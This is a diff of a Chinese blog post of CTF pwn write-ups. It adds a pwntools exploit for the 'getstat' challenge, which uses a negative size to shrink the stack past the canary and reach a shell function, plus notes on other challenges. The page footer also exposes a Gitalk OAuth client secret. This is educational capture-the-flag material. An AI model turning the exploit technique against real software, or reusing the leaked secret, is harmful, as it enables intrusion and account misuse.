@@ -19,12 +19,12 @@
     <meta name="description" content="如题">
 <meta property="og:type" content="article">
 <meta property="og:title" content="近期题目wp">
-<meta property="og:url" content="https://yogdzewa.github.io/2022-09/Now-hitcon2020/index.html">
+<meta property="og:url" content="https://yogdzewa.github.io/2022-09/Now-recent-ctf/index.html">
 <meta property="og:site_name" content="Yogdzewa">
 <meta property="og:description" content="如题">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-10-07T01:34:12.582Z">
+<meta property="article:modified_time" content="2022-10-09T02:43:20.224Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -210,7 +210,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      26k 字
+      29k 字
     </span>
   
 
@@ -219,7 +219,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      332 分钟
+      364 分钟
     </span>
   
 
@@ -260,7 +260,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年10月7日 上午
+                  不可视境界线最后变动于：2022年10月9日 上午
                 
               </p>
             
@@ -364,7 +364,52 @@
 
 <h2 id="getstat"><a href="#getstat" class="headerlink" title="getstat"></a>getstat</h2><blockquote>
 <p>CSR 2021</p>
+<p>这个比赛的pwn题好少, 就做个样子. 反而是cry(???)和ethereum较多. 而rev这种还有一题是unity背景, 这个也是不会的…..</p>
+<p>不过看了别人的wp还是挺有趣的. </p>
 </blockquote>
+<p>比较简单, 直接提供shell()函数, 而且PIE. 有canary, 但是没有方法可以leak. 于是就得绕过. 覆盖返回地址.</p>
+<p>主要的问题是无符号数输入加上这段:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401109                 lea     rax, [rdx*8]<br>.text:0000000000401111                 and     rax, 0FFFFFFFFFFFFFFF0h<br>.text:0000000000401115                 sub     rsp, rax<br></code></pre></div></td></tr></table></figure>
+
+<p>如果rdx是负数(一致性), 那么rsp减去负数就会增加, 导致栈<strong>收缩</strong>. </p>
+<p>直接把rsp收缩到返回地址附近, 此时再覆盖地址即可. </p>
+<p>唯一一个新问题是在python中把整数pack成浮点数. 新的方法如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br></code></pre></div></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">Functions to convert between Python values <span class="hljs-keyword">and</span> C structs.<br>The optional first format <span class="hljs-keyword">char</span> indicates byte order, size <span class="hljs-keyword">and</span> alignment:<br>    @: native order, <span class="hljs-function">size &amp; <span class="hljs-title">alignment</span> <span class="hljs-params">(<span class="hljs-keyword">default</span>)</span></span><br><span class="hljs-function">    </span>=: native order, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &lt;: little-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    &gt;: big-endian, <span class="hljs-built_in">std</span>. size &amp; alignment<br>    !: same as &gt;<br><br>The remaining chars indicate types of args <span class="hljs-keyword">and</span> must match exactly;<br>these can be preceded by a decimal repeat count:<br>    x: <span class="hljs-function">pad <span class="hljs-title">byte</span> <span class="hljs-params">(no data)</span></span>; c:<span class="hljs-keyword">char</span>; b:<span class="hljs-keyword">signed</span> byte; B:<span class="hljs-keyword">unsigned</span> byte;<br>    ?: <span class="hljs-built_in">_Bool</span> (<span class="hljs-keyword">requires</span> C99; <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> available, <span class="hljs-keyword">char</span> is used instead)<br>    h:<span class="hljs-keyword">short</span>; H:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>; i:<span class="hljs-keyword">int</span>; I:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>;<br>    l:<span class="hljs-keyword">long</span>; L:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>; f:<span class="hljs-keyword">float</span>; d:<span class="hljs-keyword">double</span>; e:half-<span class="hljs-keyword">float</span>.<br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(preceding decimal count indicates length)</span>:</span><br><span class="hljs-function">    s:<span class="hljs-title">string</span> <span class="hljs-params">(<span class="hljs-built_in">array</span> of <span class="hljs-keyword">char</span>)</span></span>; p: <span class="hljs-function">pascal <span class="hljs-title">string</span> <span class="hljs-params">(with count byte)</span>.</span><br><span class="hljs-function">Special <span class="hljs-title">cases</span> <span class="hljs-params">(only available in native format)</span>:</span><br><span class="hljs-function">    n:<span class="hljs-keyword">ssize_t</span></span>; N:<span class="hljs-keyword">size_t</span>;<br>    P:an integer type that is wide enough to hold a pointer.<br><span class="hljs-function">Special <span class="hljs-title">case</span> <span class="hljs-params">(<span class="hljs-keyword">not</span> in native mode unless <span class="hljs-string">&#x27;long long&#x27;</span> in platform C)</span>:</span><br><span class="hljs-function">    q:<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span></span>; Q:<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span><br>Whitespace between formats is ignored.<br></code></pre></div></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iToF</span>(<span class="hljs-params">i</span>):</span><br>  b = struct.pack(<span class="hljs-string">&#x27;q&#x27;</span>, i)<br>  <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;d&#x27;</span>, b)[<span class="hljs-number">0</span>]<br>  <br>addr = <span class="hljs-number">0x401360</span><br><br>r = process(<span class="hljs-string">&#x27;./getstat&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;-10&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(iToF(addr)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>r.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(r.clean())<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<p>SSE instructions: </p>
+<ul>
+<li></li>
+</ul>
+<p>注意的点:</p>
+<ul>
+<li>分支分析, 就比如这个输入不符合浮点数的输入就会break. </li>
+<li>无符号和有符号运算的一致性…</li>
+</ul>
+<h2 id="CSRunner"><a href="#CSRunner" class="headerlink" title="CSRunner"></a>CSRunner</h2><p>图一乐.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Common_Language_Infrastructure">Common Language Infrastructure</a> (CLI)</li>
+<li>IL2CPP</li>
+</ul>
+<h2 id="Justpwnit"><a href="#Justpwnit" class="headerlink" title="Justpwnit"></a>Justpwnit</h2><blockquote>
+<p>ASIS CTF 2021</p>
+</blockquote>
+<h2 id="PWNMEPLX"><a href="#PWNMEPLX" class="headerlink" title="PWNMEPLX"></a>PWNMEPLX</h2><blockquote>
+<p>CSR 2022</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">┌──(root💀kali)-[/mnt/LearingList/CTF/PWNMEPLX]<br>└─# checksec pwn             <br>[*] &#x27;/mnt/LearingList/CTF/PWNMEPLX/pwn&#x27;<br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></div></td></tr></table></figure>
+
+<p>这个是取绝对值的x64汇编写法: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000000000401336 8B 45 8C                                   mov     eax, [rbp+var_74]<br>.text:0000000000401339 99                                         cdq<br>.text:000000000040133A 89 D0                                      mov     eax, edx<br>.text:000000000040133C 33 45 8C                                   xor     eax, [rbp+var_74]<br>.text:000000000040133F 29 D0                                      sub     eax, edx<br>.text:0000000000401341 C9                                         leave<br>.text:0000000000401342 C3                                         retn<br></code></pre></div></td></tr></table></figure>
+
+<p>简单的栈溢出翻盖返回地址居然因为&lt;__vfscanf_internal+133&gt;处的xmmword需要0x10字节对齐而出错…….</p>
+<p>简单的不想多说. 但是还是做了好一会儿, 还在想是不是符号/浮点数的问题, 结果就是一个简单的后门栈溢出.</p>
+<p>这个比赛的pwn题全都是签到, 差点意思. </p>
 
             </div>
             <hr>
@@ -399,7 +444,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022-07/Now-CTF-newly-start/">
+                      <a href="/2022-07/Now-CTF-supplement/">
                         <span class="hidden-mobile">CTF再开始</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -425,7 +470,7 @@
         var options = Object.assign(
           {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
           {
-            id: '655e13807ea17dd18fc193086cac9236'
+            id: 'e7cbc29aee2dec9d7993a11e2f15f0d4'
           }
         )
         var gitalk = new Gitalk(options);
